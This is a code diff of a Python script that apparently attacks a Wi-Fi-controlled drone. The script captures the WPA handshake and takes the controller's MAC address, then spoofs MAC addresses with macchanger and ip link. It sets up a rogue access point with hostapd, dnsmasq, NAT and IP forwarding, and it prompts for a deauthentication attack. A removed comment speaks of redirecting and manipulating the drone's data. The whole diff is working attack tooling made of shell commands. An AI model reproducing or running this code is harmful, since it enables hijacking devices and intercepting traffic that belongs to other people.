@@ -92,26 +92,26 @@ def create_configs(iface, essid, channel_no):
     cf.create_dnsmasq(iface)
 
 def rogue_ap():
-    global iface1, bssid_name
+    global iface, bssid_name
     #os.system('sudo killall dnsmasq')
-    os.system(f'ifconfig {iface1} down')
-    os.system(f'macchanger --mac={bssid_name} {iface1}')
-    os.system(f'ifconfig {iface1} up')
-    os.system(f'ifconfig {iface1} up 192.168.2.1 netmask 255.255.255.0')
+    os.system(f'ifconfig {iface} down')
+    os.system(f'macchanger --mac={bssid_name} {iface}')
+    os.system(f'ifconfig {iface} up')
+    os.system(f'ifconfig {iface} up 192.168.2.1 netmask 255.255.255.0')
     #os.system(f'ifconfig {iface1} mtu 1400')
     os.system('route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')
     #ip forwarding and adapter bridging
     os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
     os.system('iptables --append FORWARD --in-interface wlan0 -j ACCEPT')
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf") ##look at creating virtual interface connecting to the drone when rogue ap is up
-    ##and redirect and manipulate the data
+    os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf")
+    ##look at connecting to access point without network manager
     
 def main():
     global iface,iface1, essid_name, bssid_name, channel_no
     iface = setup_monitor("wlan0")
-    iface1 = ("ap_wlan")
-    os.system(f"iw dev wlan0mon interface add {iface1} type monitor")
+    iface1 = ("drone_wlan")
+    os.system(f"iw dev wlan0mon interface add {iface1} type managed")
     print("\nWhen Done Press CTRL+C")
     time.sleep(2)
     print("Scanning for access points...")
@@ -125,13 +125,13 @@ def main():
     cc.join()
     handshake_capture()
     client_mac = mac_extract()
-    os.system(f"ifconfig {iface} down")
-    os.system(f"ip link set dev {iface} address {client_mac}")
-    os.system(f"ifconfig {iface} up")
+    os.system(f"ifconfig {iface1} down")
+    os.system(f"ip link set dev {iface1} address {client_mac}")
+    os.system(f"ifconfig {iface1} up")
     print("Fake Access Point\nWhen Done Press CTRL+C")
     time.sleep(2.0)
-    #iface = disable_monitor(iface)
-    create_configs(iface1, essid_name, channel_no)
+    #disable_monitor(iface)
+    create_configs(iface, essid_name, channel_no)
     print('Drone information:',essid_name, bssid_name, channel_no)
     print('Drone controller info:',client_mac)
     input("deauth in seperate window")
